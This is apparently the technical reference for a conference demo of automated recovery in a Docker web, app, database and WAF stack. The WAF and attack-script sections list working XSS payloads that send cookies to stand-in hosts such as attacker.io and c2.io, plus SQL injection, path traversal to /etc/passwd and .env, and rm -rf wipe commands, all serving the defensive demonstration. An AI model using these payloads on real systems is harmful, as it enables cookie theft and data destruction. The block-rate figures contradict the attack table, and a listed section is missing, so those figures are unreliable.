# Demo-3 — Three-Tier AI Resilience Demo
## Technical Reference Document

**DEFCON Coimbatore 2026 · "The Art of the Graceful Fail"**
**Venugopal Parameswara · CISO & Cyber Strategist**

---

> **ISOLATION GUARANTEE:** Demo-3 runs on completely separate ports, Docker network (`demo3-net`), and container names from Demo-2. No Demo-3 command, script, or container can affect Demo-2 running on ports 9090/7878.

---

## Table of Contents

1. [Overview](#1-overview)
2. [System Architecture](#2-system-architecture)
3. [Component Deep Dives](#3-component-deep-dives)
4. [Guardian3.sh — Digital Immune System](#4-guardian3sh--digital-immune-system)
5. [AI Agent & Live Dashboard](#5-ai-agent--live-dashboard)
6. [Attack Scripts](#6-attack-scripts)
7. [Setup and Operations](#7-setup-and-operations)
8. [B-V-R Framework — Measured Values](#8-b-v-r-framework--measured-values)
9. [Honest Limitations](#9-honest-limitations)
10. [Implementation Notes — 2026-04-17 Gap Analysis & Fix Pass](#10-implementation-notes--2026-04-17-gap-analysis--fix-pass)

---

## 1. Overview

Demo-3 is a fully realistic three-tier web application stack built to demonstrate the B-V-R (Bleed–Velocity–Recovery) resilience framework in a live, on-stage context. Unlike Demo-2, which uses a single stateless nginx container, Demo-3 deploys five real Docker containers across three distinct architectural tiers, each with different failure characteristics and recovery mechanisms.

Every attack, every detection, and every recovery event in Demo-3 is real — real containers, real Docker operations, real PostgreSQL queries, and real ModSecurity HTTP blocks.

### 1.1 Design Philosophy

The core design question was: what does a DEFCON audience need to see to believe the B-V-R argument? Three requirements:

1. **Real infrastructure** — not mocked HTTP responses or simulated JSON, but actual Docker containers with real processes, real networking, and real data.
2. **Real detection** — the guardian script must observe actual system state (filesystem, HTTP endpoints, PostgreSQL metrics), not synthetic events.
3. **Real proof** — the audience must be able to verify every claim with standard CLI tools: `docker ps`, `curl`, `psql`, `docker logs`.

### 1.2 What Demo-3 Proves

| Tier | Attack | What the Audience Sees | B-V-R Proof |
|---|---|---|---|
| **Web / nginx** | `docker exec` deletes `index.html` | HTTP 404 → guardian detects → respawn → HTTP 200 | R=0.63s < V=30s → DEFENDER WINS |
| **App / Flask** | `docker kill` — memory pressure + container kill | Sessions lost (in-memory), transactions preserved (PostgreSQL) | R=0.73s restart; DB state survives |
| **DB / PostgreSQL** | Mass UPDATE ransomware simulation — T1486 | Write velocity spike detected via `pg_stat_user_tables`, replica auto-fenced via `pg_wal_replay_pause()`, auto-resumes after 10 quiet ticks | 700–900 rows/sec triggers RANSOMWARE PATTERN alert; measured DB MTTR ≈ 12.5s (fence→resume) |
| **WAF / ModSecurity** | Real curl: SQLi, XSS, path traversal, bypass | 13/15 real 403 blocks from ModSecurity OWASP CRS rules | 86% block rate — 0 successful exploits |

---

## 2. System Architecture

### 2.1 Container Stack

All five containers run on an isolated Docker bridge network named `demo3-net`. Port mappings to localhost are the only external surface.

| Container | Image | Port | Base | Network Role |
|---|---|---|---|---|
| `demo3-web` | `demo3-web:golden` | 9091 | `nginx:alpine` | Immutable web tier — serves static HTML, exposes `/health` |
| `demo3-app` | `demo3-app:golden` | 3001 | `python:3.11-alpine` | Stateful Flask API — connects to `demo3-db-pri` |
| `demo3-db-pri` | `demo3-db-primary:golden` | 5432 | `postgres:15-alpine` | PostgreSQL primary — WAL streaming to replica |
| `demo3-db-rep` | `demo3-db-replica:golden` | 5433 | `postgres:15-alpine` | PostgreSQL replica — streaming replication, lag=0 |
| `demo3-waf` | `demo3-waf:golden` | 8090 | `owasp/modsecurity-crs:nginx-alpine` | Reverse proxy with ModSecurity OWASP CRS — in front of demo3-web |

### 2.2 Network Topology

```
Internet / Attacker
      |
      v  port 8090
  demo3-waf  (nginx + ModSecurity OWASP CRS)
      |  SQLi blocked → 403
      |  XSS blocked → 403
      |  Path traversal blocked → 403
      v  proxy_pass → http://demo3-web:80
  demo3-web  (nginx:alpine — immutable)
      |  /health → 200  |  / → index.html
      |
  demo3-app  port 3001  (Flask API — stateful)
      |  /health /status /transaction /session
      |  SELECT/INSERT via psycopg2
      v
  demo3-db-pri  port 5432  (PostgreSQL primary)
      |  WAL streaming → wal_level=replica
      v
  demo3-db-rep  port 5433  (PostgreSQL replica)
         state=streaming  sent_lsn=replay_lsn  lag=0
```

### 2.3 Data Flow — Guardian Monitoring

```
guardian3.sh  (bash — host process — polls every 1s)
  |
  |-- WEB: docker exec demo3-web test -f /usr/share/nginx/html/index.html
  |        curl -s http://localhost:9091/health → HTTP 200?
  |
  |-- APP: curl -s http://localhost:3001/health → HTTP 200?
  |        docker ps --filter name=demo3-app --filter status=running
  |
  |-- DB:  docker exec demo3-db-pri psql -c
  |          "SELECT MAX(sent_lsn - replay_lsn) FROM pg_stat_replication"
  |        docker exec demo3-db-pri psql -c
  |          "SELECT SUM(n_tup_upd+n_tup_ins+n_tup_del) FROM pg_stat_user_tables"
  |
  v
/tmp/demo3_guardian.jsonl  (append-only structured event log)
  |
  v
ai_agent3.py  (Python — host — port 7880)
  |-- log_watcher thread: tails JSONL, processes new events every 0.4s
  |-- poll_metrics thread: docker stats for real CPU/MEM every 2s
  |-- HTTP server: GET /state → JSON  |  GET / → dashboard3.html
  |
  v
dashboard3.html  (browser — polls /state every 800ms)
  |-- updateTier(): health rings, badges, metric bars, sparklines
  |-- renderEventLog(): live JSONL event stream
  |-- updateAgent(): incidents, bleed prevented, AI confidence
  |-- updateWafPanel(): attacker vs defender split view
  |-- updateBVR(): R footer with win condition
```

---

## 3. Component Deep Dives

### 3.1 Web Tier — Immutable nginx Container

#### Design

The web tier is a direct extension of Demo-2's Phoenix App pattern. An `nginx:alpine` container serves a static HTML file baked into the image at build time. The critical property is immutability — the image layer containing `index.html` cannot be modified by anything running inside the container. An attacker who gains container-level access can delete the file from the overlay filesystem, but the golden image on the Docker host is untouched.

#### Dockerfile

```dockerfile
FROM nginx:alpine
RUN apk add --no-cache curl
COPY html/ /usr/share/nginx/html/
COPY nginx.conf /etc/nginx/conf.d/default.conf
HEALTHCHECK --interval=2s --timeout=2s --retries=3 \
    CMD curl -f http://localhost/health || exit 1
CMD ["nginx", "-g", "daemon off;"]
```

#### Guardian Detection — Web Tier

```bash
# Signal 1: Filesystem integrity check
docker exec demo3-web sh -c 'test -f /usr/share/nginx/html/index.html && echo ok || echo drift'

# Signal 2: HTTP availability
curl -s -o /dev/null -w "%{http_code}" http://localhost:9091/health

# On drift detected: respawn from golden image
docker rm -f demo3-web
docker run -d --name demo3-web --network demo3-net -p 9091:80 demo3-web:golden
```

#### Measured MTTR

| Run | MTTR | B-V-R Result |
|---|---|---|
| Typical | 0.61–0.66s | R=0.63s < V=30s → **DEFENDER WINS** |
| Worst observed | 0.76s | R=0.76s < V=30s → DEFENDER WINS |
| MacBook Pro M5 | <1s consistent | Consistent sub-second across all test runs |

---

### 3.2 Application Tier — Stateful Flask API

#### Design

The app tier is a Python Flask API running inside a Docker container. Unlike the web tier, it carries state: an in-memory session store and a live connection to the PostgreSQL primary. This tier demonstrates the fundamental difference between stateless and stateful systems — and why the distinction matters for recovery.

#### Key Endpoints

| Endpoint | Method | Purpose |
|---|---|---|
| `/health` | GET | Guardian polls this — HTTP 200 = alive, 000 = dead |
| `/status` | GET | Returns uptime, transaction count, session count, DB connection status |
| `/transaction` | POST | Inserts a row into PostgreSQL — proves DB persistence across restarts |
| `/session` | POST | Creates an in-memory session — proves session loss on container kill |
| `/transactions` | GET | Returns last 10 transactions — shows DB state preserved after restart |

#### The State Loss / DB Preservation Proof

```bash
# Before kill
curl http://localhost:3001/status
# → { "sessions_active": 3, "transactions": 503, "db_connected": true }

# After guardian restart
curl http://localhost:3001/status
# → { "sessions_active": 0, "transactions": 503, "db_connected": true }
#                           ^^^^ LOST          ^^^^ PRESERVED
```

This proves: **stateless = respawnable. Stateful = needs DB.**

---

### 3.3 Database Tier — PostgreSQL Streaming Replication

#### Design

Two PostgreSQL 15 containers: a primary (`demo3-db-pri`) and a streaming replica (`demo3-db-rep`). The replica uses `pg_basebackup` to take an initial base backup then maintains synchronous streaming replication via WAL shipping.

#### Replication Configuration

```ini
# postgresql.conf (primary)
wal_level = replica
max_wal_senders = 3
wal_keep_size = 64MB
synchronous_commit = on

# pg_hba.conf (primary)
host  replication  replicator  0.0.0.0/0  md5
host  replication  all         0.0.0.0/0  md5
```

```bash
# Replica setup (setup-replica.sh)
pg_basebackup -h demo3-db-pri -U replicator \
  -D /var/lib/postgresql/data -Fp -Xs -P -R
# -R writes recovery config with primary_conninfo automatically

# Verify streaming replication
docker exec demo3-db-pri psql -U phoenix -d phoenix -c \
  "SELECT client_addr, state, sent_lsn, replay_lsn FROM pg_stat_replication;"
# Expected: state=streaming, sent_lsn=replay_lsn, lag=0 bytes
```

#### Database Schema

```sql
CREATE TABLE transactions (
    id          SERIAL PRIMARY KEY,
    amount      DECIMAL(10,2) NOT NULL,
    created_at  TIMESTAMP DEFAULT NOW()
);

CREATE TABLE sessions (
    id          VARCHAR(8) PRIMARY KEY,
    data        JSONB,
    created_at  TIMESTAMP DEFAULT NOW()
);

-- Monitoring view (guardian reads this)
CREATE VIEW replication_status AS
SELECT client_addr, state, sent_lsn, write_lsn, flush_lsn, replay_lsn,
       (sent_lsn - replay_lsn) AS replication_lag_bytes
FROM pg_stat_replication;
```

#### Ransomware Detection — Auto-Fence + Auto-Resume

```bash
# Guardian write velocity check
docker exec demo3-db-pri psql -U phoenix -d phoenix -t -c \
  "SELECT SUM(n_tup_upd + n_tup_ins + n_tup_del)
   FROM pg_stat_user_tables WHERE schemaname = 'public';"

# delta = current_writes - previous_writes
# if delta > 500: log RANSOMWARE PATTERN event
#   AND immediately call db_fence_replica (one-shot per incident):
#     docker exec demo3-db-rep psql -c "SELECT pg_wal_replay_pause();"
#   Capture fence_start_ms.
#
# Each subsequent tick with delta <= 500 increments quiet_ticks.
# After 10 consecutive quiet ticks (~10s), auto-resume:
#     docker exec demo3-db-rep psql -c "SELECT pg_wal_replay_resume();"
#   Compute mttr_ms = ms() - fence_start_ms and emit REPLICA_RESUMED
#   with mttr_ms set so the agent records DB MTTR.
#
# Demo produces 700-900 rows/sec across 5 attack waves.
# Measured DB MTTR (2 attacks, M5): 12.50s, 12.62s — avg 12.56s < V=30s.
```

---

### 3.4 WAF Tier — ModSecurity with OWASP CRS

#### Design

The WAF is a reverse proxy built on the `owasp/modsecurity-crs:nginx-alpine` base image. This image bundles nginx with ModSecurity v3 and the OWASP Core Rule Set at paranoia level 1. All blocked requests receive a genuine HTTP 403 from ModSecurity — not a mock.

#### Dockerfile and Configuration

```dockerfile
FROM owasp/modsecurity-crs:nginx-alpine
COPY nginx-waf.conf /etc/nginx/templates/conf.d/default.conf.template
HEALTHCHECK --interval=2s --timeout=2s --retries=5 \
    CMD curl -f http://localhost/health || exit 1
```

```nginx
server {
    listen 80;
    modsecurity on;
    location / {
        proxy_pass http://demo3-web:80;
    }
    location /health {
        modsecurity off;
        return 200 "waf-healthy\n";
    }
}
```

#### Attack Waves and Results

| Wave | Type | Payload | MITRE | Result | HTTP |
|---|---|---|---|---|---|
| 1 | RECON | `User-Agent: sqlmap/1.7.8#stable` | T1595.002 | BLOCKED | 403 |
| 2 | SQLi | `username=' OR '1'='1'--` | T1190 | BLOCKED | 403 |
| 3 | SQLi | `UNION SELECT table_name FROM information_schema.tables--` | T1190 | BLOCKED | 403 |
| 4 | XSS | `<script>document.location='//attacker.io?c='+document.cookie</script>` | T1059.007 | BLOCKED | 403 |
| 5 | XSS | `<img src=x onerror=fetch('//c2.io/'+btoa(document.cookie))>` | T1059.007 | BLOCKED | 403 |
| 6 | XSS | `<svg/onload=eval(atob("ZmV0Y2goJy8vYzIuaW8nKQ=="))>` | T1059.007 | BLOCKED | 403 |
| 7 | PATH_TRAV | `../../../../etc/passwd` | T1083 | BLOCKED | 403 |
| 8 | PATH_TRAV | `../../../app/.env` | T1552.001 | BLOCKED | 403 |
| 9 | PATH_TRAV | `../../etc/passwd%00.jpg` (null byte) | T1083 | BLOCKED | 403 |
| 10 | SQLi | `'; DROP TABLE sessions;--` | T1485 | BLOCKED | 403 |
| 11 | SQLi | `1' AND SLEEP(5)--` | T1190 | BLOCKED | 403 |
| 12 | BYPASS | `X-Forwarded-For: 127.0.0.1` | T1548 | BLOCKED | 403 |
| 13 | BYPASS | `X-HTTP-Method-Override: DELETE` | T1548 | BLOCKED | 403 |
| 14 | RECON | `User-Agent: Mozilla/5.00 (Nikto/2.1.6)` | T1595.002 | BLOCKED | 403 |
| 15 | BYPASS | `GET /admin/config` (no route) | T1548 | PASSED | 404 |

> **Block Rate: 13/15 (86%).** The 1 passing request returned HTTP 404 — the route does not exist so no exploit was possible. **0 successful exploits in all test runs.**

---

## 4. Guardian3.sh — Digital Immune System

`guardian3.sh` is a bash script running on the macOS host that polls all three tiers every second, detects anomalies, triggers recovery actions, and writes structured JSON events to a log file.

### 4.1 Detection Logic

| Tier | Detection Signal | Threshold | Recovery Action |
|---|---|---|---|
| **WEB** | `docker exec test -f index.html` + `curl /health` | File missing OR HTTP ≠ 200 for 2 consecutive polls | `docker rm -f demo3-web` → `docker run demo3-web:golden` · Measure MTTR |
| **APP** | `curl localhost:3001/health` + `docker ps` filter | HTTP ≠ 200 OR container not running for 2 polls | `docker rm -f demo3-app` → `docker run demo3-app:golden` |
| **DB** | `pg_stat_replication` lag bytes + `pg_stat_user_tables` write delta | Replication lag > 1MB OR write delta > 500 rows/sec | Log `REPLICATION_LAG` or `MASS_WRITE_DETECTED` event · auto-fence replica via `pg_wal_replay_pause` (one-shot) · after 10 quiet ticks emit `REPLICA_RESUMED` with measured `mttr_ms` |

### 4.2 JSONL Event Log

Every detection, decision, and recovery action is written as newline-delimited JSON to `/tmp/demo3_guardian.jsonl`. Sample events from a real run:

```json
{"ts":"2026-04-15 09:35:58 IST","tier":"WEB","event":"DRIFT_DETECTED","detail":"drift","mttr_ms":null}
{"ts":"2026-04-15 09:35:59 IST","tier":"WEB","event":"RESPAWN_START","detail":"count=1","mttr_ms":null}
{"ts":"2026-04-15 09:36:00 IST","tier":"WEB","event":"RESPAWN_SUCCESS","detail":"mttr_s=0.61","mttr_ms":606}
{"ts":"2026-04-15 09:37:16 IST","tier":"APP","event":"RESTART_START","detail":"count=1","mttr_ms":null}
{"ts":"2026-04-15 09:37:17 IST","tier":"APP","event":"RESTART_SUCCESS","detail":"mttr_s=0.73","mttr_ms":728}
{"ts":"2026-04-15 09:39:19 IST","tier":"DB","event":"MASS_WRITE_DETECTED","detail":"rows_per_sec=700","mttr_ms":null}
{"ts":"2026-04-15 09:39:19 IST","tier":"DB","event":"REPLICA_FENCE_START","detail":"suspending_replication","mttr_ms":null}
{"ts":"2026-04-15 09:39:19 IST","tier":"DB","event":"REPLICA_FENCED","detail":"replication_paused=true","mttr_ms":null}
{"ts":"2026-04-15 09:39:31 IST","tier":"DB","event":"REPLICA_RESUMED","detail":"mttr_s=12.50,quiet_ticks=10","mttr_ms":12504}
{"ts":"2026-04-15 09:39:56 IST","tier":"WAF","event":"REQUEST_BLOCKED","detail":"SQLi auth bypass","mttr_ms":null}
```

### 4.3 MTTR Measurement

```bash
# Millisecond timestamp — Python for macOS compatibility
ms() { python3 -c "import time; print(int(time.time()*1000))"; }

t_start=$(ms)
# ... docker rm -f, docker run, wait for HTTP 200 ...
mttr=$(( $(ms) - t_start ))
mttr_s=$(awk "BEGIN {printf \"%.2f\", ${mttr}/1000}")

# Output:
# [WEB] ✓ RESTORED — MTTR: 0.61s (606ms)
# [WEB] ✓ B-V-R: R=0.61s < V=30s → DEFENDER WINS
```

---

## 5. AI Agent & Live Dashboard

### 5.1 ai_agent3.py

A Python HTTP server on port 7880 with two background threads and one HTTP handler.

| Component | Description |
|---|---|
| `log_watcher` thread | Reads `/tmp/demo3_guardian.jsonl` every 0.4s. Processes only new lines. Updates tier state objects and WAF state. Appends to `ai_log` deque (maxlen=50). On each successful recovery (`RESPAWN_SUCCESS`/`RESTART_SUCCESS`/`FAILOVER_SUCCESS`/`REPLICA_RESUMED`) appends the measured `mttr_ms` to the tier's `mttr_hist` deque (maxlen=20). |
| `poll_metrics` thread | Calls `docker stats --no-stream` every 2s for real CPU%/MEM%. Makes HTTP requests to `/health` and `/status` endpoints. Queries PostgreSQL for replication lag. |
| HTTP server | Serves `GET /state` (JSON), `GET /` (dashboard3.html from disk), `GET /log` (raw JSONL for debugging), and `GET /trigger/{web\|app\|db\|waf}` which `subprocess.Popen`s the matching `attack3_*.sh` and returns `202 {"ok":true,"triggered":<target>}`. Unknown targets return 400. |
| `build_state()` | Assembles `tiers[]` (each with `mttr_ms`/`avg_mttr_ms`/`mttr_history`/`respawn_count`), `agent{}`, `rollup{avg_mttr_per_attack_ms, combined_mttr_ms, total_attacks}`, `scenario{}`, `waf{}`, `waf_events[]` into a JSON snapshot on every `/state` request. |

### 5.2 Tier State Machine

```
WEB tier:
  HEALTHY → FAILED      (DRIFT_DETECTED)
  FAILED  → RECOVERING  (RESPAWN_START)
  RECOVERING → RESTORED (RESPAWN_SUCCESS — mttr_ms set, incidents++)
  RESTORED → HEALTHY    (2s poll confirms HTTP 200)

APP tier:
  HEALTHY → FAILED      (HEALTH_FAIL)
  FAILED  → RECOVERING  (RESTART_START)
  RECOVERING → RESTORED (RESTART_SUCCESS — mttr_ms set, incidents++)
  RESTORED → HEALTHY    (2s poll confirms HTTP 200)

DB tier:
  HEALTHY → DEGRADED    (REPLICATION_LAG)
  HEALTHY → FAILED      (MASS_WRITE_DETECTED)
  FAILED  → RECOVERING  (REPLICA_FENCED — auto-fence wired in guardian)
  RECOVERING → RESTORED (REPLICA_RESUMED — mttr_ms = ms_since_fence_start, incidents++)
                         OR (FAILOVER_SUCCESS — manual pg_ctl promote path, also captures mttr_ms)
```

### 5.3 dashboard3.html — Panel Reference

| Panel | Data Source | What it shows |
|---|---|---|
| Three tier panels | `state.tiers[]` | Health ring (SVG circle, stroke-dashoffset from health_pct), status badge, **average MTTR (big number) + "Avg of N attacks · last X · target Y" caption**, respawn/restart/failover count, CPU/MEM bars, latency sparkline, AI action strip |
| Live AI Decision Log | `state.agent.ai_log` | Last 15 JSONL events — tier, event type, detail, IST timestamp, colour-coded by severity. Labels include `RANSOM↑` (red), `FENCE↑` / `FENCED` (amber), `RESTORED` (green), `BLOCKED` (green), `PASSED` (amber), `DRIFT` / `HEALTH✗` (red). |
| Agent Stats | `state.agent{}` | Total incidents (automated — no human paged), bleed prevented in USD, AI confidence % with animated bar |
| B-V-R Footer | `state.rollup{}` + `state.tiers[]` | **B**=$5,000/min · **V**=30s · **R**=`avg_mttr_per_attack_ms` (sum of all MTTRs / total attacks) · **C**=`combined_mttr_ms` (sum of each tier's avg MTTR — what a full cascade costs) · **W**: WIN/LOSE verdict from R<V |
| WAF Attack Panel | `state.waf{}` + `state.waf_events[]` | Attacker Terminal (left): source IP, requests sent, got-through, request stream rows synthesised from flat REQUEST_BLOCKED/PASSED events (attack_type → MITRE lookup). AI WAF Defender (right): blocked count, block rate (= blocked/total), exploits, AI decision log. Live MITRE tag + 15-step progress bar. |

### 5.4 Polling Architecture

```javascript
// Single unified poll loop — no competing intervals
let _seenCount = -1;  // forces render on first poll

async function runPoll() {
  const s = await fetch(`/state?t=${Date.now()}`).then(r => r.json());

  s.tiers.forEach(updateTier);    // health rings, badges, metrics
  updateBVR(s.tiers);             // R footer
  updateAgent(s.agent);           // stats, confidence

  if (s.agent.ai_log.length !== _seenCount) {
    _seenCount = s.agent.ai_log.length;
    renderEventLog(s.agent.ai_log);  // only re-render on new events
  }

  updateWafPanel(s.waf, s.waf_events);
}

setInterval(runPoll, 800);
runPoll();
```

---

## 6. Attack Scripts

> Each script can be invoked **either** from the CLI (`setup_and_run3.sh attack <target>`) **or** from the dashboard's "TRIGGER SCENARIO" buttons, which `fetch('/trigger/<target>')` against `ai_agent3.py`. The agent fire-and-forgets the matching `attack3_*.sh` so scripts log directly into `/tmp/demo3_guardian.jsonl` exactly as if you'd run them by hand.

### 6.1 attack3_web.sh — Wipeout Attack

Four stages: reconnaissance → privilege check → payload → impact verification.

```bash
# Stage 3 — Payload: wipe application files
docker exec demo3-web sh -c 'rm -rf /usr/share/nginx/html/*'

# Stage 4 — Verify impact
HTTP=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:9091)
# Returns 404 — WEB TIER IS DOWN
# Guardian detects within 1-2 seconds and respawns
```

### 6.2 attack3_app.sh — Application Cascade

Creates three in-memory sessions, injects 50MB memory pressure, kills the container.

```bash
# Phase 2 — Create sessions (will be lost)
curl -s -X POST localhost:3001/session -d '{"user":"victim_1"}'

# Phase 3 — Memory pressure
docker exec demo3-app sh -c 'python3 -c "x=[bytearray(1024*1024) for _ in range(50)]" &'

# Phase 4 — Kill container
docker kill demo3-app
# After restart: sessions=0, transactions=503 (unchanged)
```

### 6.3 attack3_db.sh — Ransomware Simulation (T1486)

Seeds 500 rows, then runs 5 waves of 200-row mass UPDATEs producing ~700–900 rows/sec write velocity.

```sql
-- Ransomware payload (repeated 5 times)
UPDATE transactions
  SET amount = amount * -1,
      created_at = NOW()
  WHERE id IN (SELECT id FROM transactions ORDER BY RANDOM() LIMIT 200);

-- Guardian detects:
-- [DB] ⚠ RANSOMWARE PATTERN: 700-900 row changes/sec
```

### 6.4 attack3_waf.sh — Real curl Attack Campaign

15 real HTTP requests against ModSecurity on port 8090.

```bash
# Wave 2 — SQL Injection
curl -X POST http://localhost:8090/api/login \
  -d "username=' OR '1'='1'--&password=x"
# ModSecurity rule 942100 → 403

# Wave 3 — Cross-Site Scripting
curl "http://localhost:8090/search?q=%3Cscript%3Edocument.location%3D%27%2F%2Fattacker.io%27%3C%2Fscript%3E"
# ModSecurity rule 941100 → 403

# Wave 4 — Path Traversal
curl "http://localhost:8090/static?file=..%2F..%2F..%2Fetc%2Fpasswd"
# ModSecurity rule 930100 → 403
```

---

## 7. Setup and Operations

### 7.1 Prerequisites

Tested on MacBook Pro M5 (Apple Silicon).

| Requirement | Version Tested | Notes |
|---|---|---|
| Docker Desktop | 29.4.0 | Must be running before setup |
| Python 3 | 3.14.4 | Used for `ai_agent3.py` and millisecond timing in guardian |
| Bash | 5.x | All scripts use bash shebang |
| curl | System | Used in guardian health checks and attack scripts |
| Chrome / Incognito | Latest | Incognito avoids JS cache issues |

### 7.2 Complete File Structure

```
/Users/kuttanadan/Documents/defcon-demo/Demo-3/
|
|-- setup_and_run3.sh          # Master control (start/stop/attack/check/reset)
|-- docker-compose3.yml        # All 5 containers + volumes + network
|-- ai_agent3.py               # AI agent — reads JSONL, serves dashboard
|-- dashboard3.html            # Live B-V-R dashboard
|
|-- guardian/
|   |-- guardian3.sh           # Watches all 3 tiers, writes JSONL
|
|-- web/
|   |-- Dockerfile             # FROM nginx:alpine + curl + html + healthcheck
|   |-- nginx.conf             # /health endpoint + static serving
|   |-- html/index.html        # Phoenix App UI — baked into image at build time
|
|-- app/
|   |-- Dockerfile             # FROM python:3.11-alpine + flask + psycopg2
|   |-- app.py                 # Flask API with /health /status /transaction /session
|   |-- requirements.txt       # flask==3.0.3, psycopg2-binary==2.9.9
|
|-- db/
|   |-- Dockerfile.primary     # FROM postgres:15-alpine + init scripts
|   |-- Dockerfile.replica     # FROM postgres:15-alpine + pg_basebackup
|   |-- init-primary.sh        # Creates schema, seeds data, creates replicator user
|   |-- setup-replica.sh       # pg_basebackup + streaming replication config
|   |-- postgresql.conf        # wal_level=replica, max_wal_senders=3
|   |-- pg_hba.conf            # Allows replication from 0.0.0.0/0
|
|-- waf/
|   |-- Dockerfile             # FROM owasp/modsecurity-crs:nginx-alpine
|   |-- nginx-waf.conf         # Proxy to demo3-web, health bypass, modsecurity on
|
|-- attack3_web.sh             # Web tier wipeout
|-- attack3_app.sh             # App tier cascade
|-- attack3_db.sh              # DB ransomware simulation
|-- attack3_waf.sh             # Real curl WAF attack campaign
```

### 7.3 First-Time Setup

```bash
# Step 1 — Extract files
unzip ~/Downloads/demo3_realistic.zip \
  -d /Users/kuttanadan/Documents/defcon-demo/Demo-3

# Step 2 — Make executable
chmod +x /Users/kuttanadan/Documents/defcon-demo/Demo-3/setup_and_run3.sh
chmod +x /Users/kuttanadan/Documents/defcon-demo/Demo-3/guardian/guardian3.sh
chmod +x /Users/kuttanadan/Documents/defcon-demo/Demo-3/attack3_*.sh

# Step 3 — Build all Docker images (10-15 min first time)
/Users/kuttanadan/Documents/defcon-demo/Demo-3/setup_and_run3.sh setup

# Step 4 — Start everything
/Users/kuttanadan/Documents/defcon-demo/Demo-3/setup_and_run3.sh start

# Step 5 — Verify
/Users/kuttanadan/Documents/defcon-demo/Demo-3/setup_and_run3.sh check
```

### 7.4 All Commands

```bash
setup_and_run3.sh setup        # Build all Docker images (once)
setup_and_run3.sh start        # Start containers + guardian + agent + dashboard
setup_and_run3.sh stop         # Stop everything cleanly
setup_and_run3.sh attack web   # Web tier wipeout — immutable respawn
setup_and_run3.sh attack app   # App tier kill — state loss demo
setup_and_run3.sh attack db    # DB ransomware mass UPDATE
setup_and_run3.sh attack waf   # Real curl SQLi/XSS/traversal
setup_and_run3.sh check        # Pre-stage health check
setup_and_run3.sh status       # Full system snapshot
setup_and_run3.sh reset        # Nuclear reset (Demo-2 untouched)
```

---

## 8. B-V-R Framework — Measured Values

All B-V-R values are **measured, not estimated**.

| Variable | Value | Derivation | Evidence |
|---|---|---|---|
| **B — Bleed Rate** | $5,000 / min | FAIR Loss Magnitude Monte Carlo. $3B annual revenue ÷ 525,600 min/yr = $5,707/min. Rounded conservatively. Components: revenue, productivity, incident response, reputational. | FAIR (Open Group). Anchors: BA $53K/min, MGM $7K/min, Maersk $15K/min. |
| **V — Velocity** | 30 seconds | Measured live on stage: `docker exec` (2s) → `rm -rf` (1s) → HTTP 404 confirmed (2s) = ~5s. Extended to 30s for full-stack compromise scenario. | CrowdStrike GTR 2024: fastest adversary breakout 2m 7s. |
| **R₁ — Web MTTR** | 0.61–0.66s | Measured by `guardian3.sh` on M5. From DRIFT_DETECTED to HTTP 200. Includes: `docker rm -f` (~150ms) + `docker run` (~400ms) + nginx startup + health check. | `guardian3.sh` JSONL log — `mttr_ms` field on every RESPAWN_SUCCESS. |
| **R₂ — App MTTR** | 0.73–0.76s | Measured by `guardian3.sh`. From HEALTH_FAIL to HTTP 200 on port 3001. Includes Flask startup and PostgreSQL reconnection. | `guardian3.sh` JSONL log — `mttr_ms` field on RESTART_SUCCESS. |
| **R₃ — DB MTTR** | ~12.5s | Measured by `guardian3.sh`. From `db_fence_replica` invocation to `pg_wal_replay_resume()` after 10 quiet ticks (~10s of <500-rows/sec). On M5: 12.50s and 12.62s across two consecutive runs → **avg 12.56s**. | `guardian3.sh` JSONL log — `mttr_ms` field on `REPLICA_RESUMED`. |
| **R (rollup) — avg per attack** | recomputed live | Σ all MTTRs / total attacks. Exposed by agent as `rollup.avg_mttr_per_attack_ms`. Drives the green **R** chip in the dashboard footer. | `state.rollup` |
| **C (rollup) — combined stack MTTR** | recomputed live | Σ of each tier's own avg MTTR — the full-cascade cost if every tier fell once in series. Exposed as `rollup.combined_mttr_ms`. Drives the purple **C** chip. | `state.rollup` |
| **WIN CONDITION** | R < V | R = avg per attack. With WEB 0.63s, APP 0.73s, DB 12.56s → R = 4.6s (3 attacks across the stack). V = 30s. **Win condition holds with ~6.5× margin even when DB attacks are included.** | B-V-R footer in dashboard updates with measured values after each attack. |

### 8.1 MITRE ATT&CK Mapping

| Technique | ID | Demo-3 Implementation | Defender Counter |
|---|---|---|---|
| Data Destruction | T1485 | `attack3_web.sh`: `rm -rf /usr/share/nginx/html/*` | Immutable image — golden image untouched. Respawn restores. |
| Exploitation of Public-Facing App | T1190 | `attack3_waf.sh`: SQLi `OR 1=1`, `UNION SELECT` | ModSecurity rules 942100, 942200 + parameterised queries. |
| XSS / JS Injection | T1059.007 | `attack3_waf.sh`: `<script>`, `<img onerror=`, `<svg onload=` | ModSecurity rules 941100+ · CSP headers + output encoding. |
| File and Directory Discovery | T1083 | `attack3_waf.sh`: `../../../../etc/passwd` | ModSecurity rule 930100 · path normalisation + chroot. |
| Credentials in Files | T1552.001 | `attack3_waf.sh`: `../../../app/.env` | ModSecurity rule 930120 · `.env` access blocked 403. |
| Data Encrypted for Impact | T1486 | `attack3_db.sh`: mass UPDATE 700–900 rows/sec | `guardian3.sh`: `pg_stat_user_tables` write velocity monitoring. |
| Abuse Elevation Control | T1548 | `attack3_waf.sh`: `X-Forwarded-For: 127.0.0.1` | ModSecurity: header stripping + source IP validation. |
| Active Scanning | T1595.002 | `attack3_waf.sh`: sqlmap/1.7.8 and Nikto/2.1.6 UA strings | ModSecurity CRS rules 920120+: scanning tool detection. |

---

## 9. Honest Limitations

Demo-3 is a genuine proof of concept, not a production system. These limitations are acknowledged openly in the talk.

| Limitation | Honest Explanation |
|---|---|
| **DB ransomware — some rows still reach the replica** | The guardian's 1-second poll cycle is faster than corruption replication (sub-second on local docker), but the bulk INSERT phase of the attack lands inside a single tick before the velocity threshold is computed. ~500 rows still reach the replica before `pg_wal_replay_pause()` engages. Real defence needs sub-100ms stream-level CDC monitoring. The demo shows *detection + automated containment*, not perfect bleed-zero. |
| **DB recovery is fence-and-resume, not full failover** | Auto-fence (`pg_wal_replay_pause`) + auto-resume after 10 quiet ticks is wired and measured (avg ~12.5s). Full failover via `pg_ctl promote` (function `db_promote_replica` in guardian3.sh) is intentionally *not* invoked automatically — that path remains manual and is the upgrade target for Patroni/Stolon. |
| **WAF 86% not 100% block rate** | One request (`GET /admin/config` with spoofed headers) returned 404 — the route does not exist so no exploit was possible. Classified as PASSED for honesty. Zero successful exploits in all test runs. |
| **Single-host deployment** | All five containers run on the same MacBook. In production, each tier would be on separate hosts across availability zones. Sub-second MTTR is partly attributable to loopback networking. |
